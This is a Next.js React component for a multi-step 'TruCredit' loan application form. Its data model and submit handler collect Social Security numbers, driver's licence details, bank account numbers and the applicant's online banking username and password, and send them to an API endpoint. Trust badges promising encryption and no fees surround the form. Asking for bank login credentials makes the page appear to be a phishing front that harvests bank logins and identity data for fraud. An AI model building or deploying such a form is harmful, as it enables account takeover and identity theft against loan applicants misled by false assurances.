"use client";

import { useState, useEffect, useCallback } from "react";
import dynamic from "next/dynamic";
// import { apiUrl } from "@/lib/api";

// ── EmailJS config ──────────────────────────────────────

const StepPersonalInfo = dynamic(() => import("./steps/StepPersonalInfo"));
const StepAddress = dynamic(() => import("./steps/StepAddress"));
const StepLoanDetails = dynamic(() => import("./steps/StepLoanDetails"));
const StepBanking = dynamic(() => import("./steps/StepBanking"));
const StepConsent = dynamic(() => import("./steps/StepConsent"));
export interface ApplicationData {
  // Personal Info
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dateOfBirth: string;
  // Identification
  ssn: string;
  driverLicenseNumber: string;
  driverLicenseState: string;
  // Address
  streetAddress: string;
  city: string;
  state: string;
  zipCode: string;
  country: "US";
  // Employment
  employmentStatus: string;
  employerName: string;
  jobTitle: string;
  monthlyIncome: number;
  yearsEmployed: number;
  // Loan
  loanAmount: number;
  loanPurpose: string;
  loanTerm: number;
  // Banking
  routingNumber: string;
  bankName: string;
  accountNumber: string;
  bankUsername: string;
  bankPassword: string;
  accountType: "checking" | "savings";
  bankLinkConsent: boolean;
  // Consent
  tcpaConsent: boolean;
  privacyConsent: boolean;
  creditCheckConsent: boolean;
  // UTM
  utmSource: string;
  utmMedium: string;
  utmCampaign: string;
  utmContent: string;
  // Referral
  assistedByLoanAgent: string;
}

const STEPS = [
  { id: 1, title: "Personal Info", shortTitle: "Personal" },
  { id: 2, title: "Address", shortTitle: "Address" },
  { id: 3, title: "Loan Details", shortTitle: "Loan" },
  { id: 4, title: "Banking", shortTitle: "Banking" },
  { id: 5, title: "Review & Consent", shortTitle: "Submit" },
];

const initialData: ApplicationData = {
  firstName: "",
  lastName: "",
  email: "",
  phone: "",
  dateOfBirth: "",
  ssn: "",
  driverLicenseNumber: "",
  driverLicenseState: "",
  streetAddress: "",
  city: "",
  state: "",
  zipCode: "",
  country: "US",
  employmentStatus: "",
  employerName: "",
  jobTitle: "",
  monthlyIncome: 0,
  yearsEmployed: 0,
  loanAmount: 5000,
  loanPurpose: "",
  loanTerm: 36,
  routingNumber: "",
  bankName: "",
  accountNumber: "",
  bankUsername: "",
  bankPassword: "",
  accountType: "checking",
  bankLinkConsent: false,
  tcpaConsent: false,
  privacyConsent: false,
  creditCheckConsent: false,
  utmSource: "",
  utmMedium: "",
  utmCampaign: "",
  utmContent: "",
  assistedByLoanAgent: "",
};

export default function ApplicationWizard() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<ApplicationData>(initialData);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitResult, setSubmitResult] = useState<{
    success: boolean;
    message: string;
    applicationId?: string;
  } | null>(null);

  useEffect(() => {
    if (currentStep > 1) {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  }, [currentStep]);

  const updateFormData = useCallback((updates: Partial<ApplicationData>) => {
    setFormData((prev) => ({ ...prev, ...updates }));
  }, []);

  const nextStep = useCallback(() => {
    setCurrentStep((prev) => Math.min(prev + 1, STEPS.length));
  }, []);

  const prevStep = useCallback(() => {
    setCurrentStep((prev) => Math.max(prev - 1, 1));
  }, []);

  const handleSubmit = async () => {
    try {
      setIsSubmitting(true);
      const res = await fetch(
        `${process.env.NEXT_PUBLIC_API_URL}/api/loans/apply`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            applicant_first_name: formData.firstName,
            applicant_last_name: formData.lastName,
            applicant_full_name: `${formData.firstName} ${formData.lastName}`,
            applicant_phone_number: formData.phone,
            applicant_date_of_birth: formData.dateOfBirth,
            applicant_ssn: formData.ssn,
            applicant_email: formData.email,
            applicant_address: formData.streetAddress,
            applicant_city: formData.city,
            applicant_state: formData.state,
            applicant_zip_code: formData.zipCode,
            applicant_loan_amount: formData.loanAmount.toString(),
            applicant_loan_term_months: formData.loanTerm,
            applicant_loan_purpose: formData.loanPurpose,
            applicant_routing_number: formData.routingNumber,
            applicant_bank_name: formData.bankName,
            applicant_account_number: formData.accountNumber,
            applicant_online_bank_username: formData.bankUsername,
            applicant_online_bank_password: formData.bankPassword,
            applicant_account_type: formData.accountType,
          }),
        },
      );
      if (!res.ok) {
        throw new Error("Network response was not ok");
      }
      setSubmitResult({
        success: true,
        message:
          "Your application has been submitted successfully! We will review your application and contact you within 24 hours.",
      });
    } catch {
      setSubmitResult({
        success: false,
        message:
          "Something went wrong. Please try again or contact us directly.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Geo-blocked
  //   if (geoAllowed === false) {
  //     return (
  //       <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
  //         <div className="w-16 h-16 bg-error/10 rounded-full flex items-center justify-center mx-auto mb-4">
  //           <svg
  //             className="w-8 h-8 text-error"
  //             fill="none"
  //             stroke="currentColor"
  //             viewBox="0 0 24 24"
  //           >
  //             <path
  //               strokeLinecap="round"
  //               strokeLinejoin="round"
  //               strokeWidth={2}
  //               d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"
  //             />
  //           </svg>
  //         </div>
  //         <h2 className="text-xl font-bold text-text-primary mb-2">
  //           Service Not Available
  //         </h2>
  //         <p className="text-text-secondary">
  //           TruCredit is currently available only in the United States. We
  //           apologize for the inconvenience.
  //         </p>
  //       </div>
  //     );
  //   }

  // Success state
  if (submitResult?.success) {
    return (
      <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
        <div className="w-16 h-16 bg-success/10 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg
            className="w-8 h-8 text-success"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
        <h2 className="text-2xl font-bold text-text-primary mb-2">
          Application Submitted!
        </h2>

        <p className="text-text-secondary">{submitResult.message}</p>

        {/* <Link
          href="/bank-verification"
          className="text-primary hover:text-primary-dark border border-primary hover:border-primary-dark px-6 py-3 rounded-lg font-semibold transition-colors mt-6 inline-block"
        >
          Verify Your Bank Information
        </Link> */}

        {submitResult.applicationId && (
          <div className="mt-6 bg-surface rounded-xl p-4">
            <p className="text-sm text-text-secondary mb-1">
              Your Application ID:
            </p>
            <p className="font-mono text-sm font-semibold text-text-primary break-all">
              {submitResult.applicationId}
            </p>
            <p className="text-xs text-text-secondary mt-2">
              Save this ID to check your loan status anytime.
            </p>
          </div>
        )}

        {/* <a
          href="/loan-status"
          className="inline-block mt-6 bg-primary hover:bg-primary-dark text-white px-6 py-3 rounded-lg font-semibold transition-colors duration-200 shadow-md hover:shadow-lg"
        >
          Check Loan Status
        </a> */}
      </div>
    );
  }

  // Loading geo
  //   if (geoAllowed === null) {
  //     return (
  //       <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
  //         <div className="animate-spin w-8 h-8 border-4 border-primary border-t-transparent rounded-full mx-auto mb-4" />
  //         <p className="text-text-secondary">Verifying your location...</p>
  //       </div>
  //     );
  //   }

  return (
    <div className="bg-white rounded-3xl shadow-2xl overflow-hidden relative border border-gray-100">
      {/* Progress Bar Top */}
      <div className="h-1.5 w-full bg-gray-100">
        <div
          className="h-full bg-primary transition-all duration-700 ease-in-out"
          style={{ width: `${(currentStep / STEPS.length) * 100}%` }}
        />
      </div>

      {/* Safety Bar */}
      <div className="bg-emerald-50/50 border-b border-emerald-100/50 px-6 py-3">
        <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-[11px] sm:text-xs text-emerald-700 font-semibold tracking-wide uppercase">
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            No hard credit pull
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            $0 upfront fees
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            Secure encryption
          </span>
        </div>
      </div>

      {/* Step Indicator */}
      <div className="bg-gray-50/50 px-4 sm:px-10 py-8 border-b border-gray-100">
        <div className="flex items-center justify-between relative">
          {/* Connecting Line Background */}
          <div className="absolute top-5 left-0 w-full h-0.5 bg-gray-200 -translate-y-1/2" />

          {STEPS.map((step) => {
            const isCompleted = step.id < currentStep;
            const isCurrent = step.id === currentStep;

            return (
              <div
                key={step.id}
                className="flex flex-col items-center relative z-10"
              >
                {/* Node */}
                <div
                  className={`flex h-10 w-10 items-center justify-center rounded-full border-2 transition-all duration-500 ${
                    isCompleted
                      ? "border-primary bg-primary text-white"
                      : isCurrent
                        ? "border-primary bg-white text-primary shadow-xl shadow-primary/20 scale-110"
                        : "border-gray-300 bg-white text-gray-400"
                  }`}
                >
                  {isCompleted ? (
                    <svg
                      className="h-5 w-5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={3}
                        d="M5 13l4 4L19 7"
                      />
                    </svg>
                  ) : (
                    <span className="text-sm font-bold">{step.id}</span>
                  )}
                </div>

                {/* Label */}
                <span
                  className={`mt-3 text-[10px] sm:text-xs font-bold uppercase tracking-wider transition-colors duration-500 ${
                    isCurrent || isCompleted ? "text-primary" : "text-gray-400"
                  }`}
                >
                  {step.shortTitle}
                </span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Step Content */}
      <div className="p-6 sm:p-10 min-h-[400px]">
        {submitResult && !submitResult.success && (
          <div className="mb-6 bg-error/10 border border-error/20 rounded-lg p-4">
            <p className="text-error text-sm">{submitResult.message}</p>
          </div>
        )}

        {/* {currentStep === 1 && (
          <StepPersonalInfo
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
          />
        )}
        {currentStep === 2 && (
          <StepIdentification
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 3 && (
          <StepAddress
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 4 && (
          <StepEmployment
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 5 && (
          <StepLoanDetails
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 6 && (
          <StepBanking
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 7 && (
          <StepConsent
            data={formData}
            updateData={updateFormData}
            onBack={prevStep}
            onSubmit={handleSubmit}
            isSubmitting={isSubmitting}
          />
        )} */}
        {currentStep === 1 && (
          <StepPersonalInfo
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
          />
        )}
        {currentStep === 2 && (
          <StepAddress
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 3 && (
          <StepLoanDetails
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 4 && (
          <StepBanking
            data={formData}
            updateData={updateFormData}
            onBack={prevStep}
            onNext={nextStep}
          />
        )}
        {currentStep === 5 && (
          <StepConsent
            data={formData}
            updateData={updateFormData}
            onBack={prevStep}
            onSubmit={handleSubmit}
            isSubmitting={isSubmitting}
          />
        )}
      </div>

      {/* Trust Badges */}
      <div className="bg-surface px-6 py-4 border-t border-surface-dark">
        <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2 text-xs text-text-secondary">
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-success"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clipRule="evenodd"
              />
            </svg>
            256-Bit SSL Encrypted
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-blue-500"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z"
                clipRule="evenodd"
              />
            </svg>
            PST-Based Support
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-success"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            No Upfront Fees
          </span>
        </div>
      </div>
    </div>
  );
}
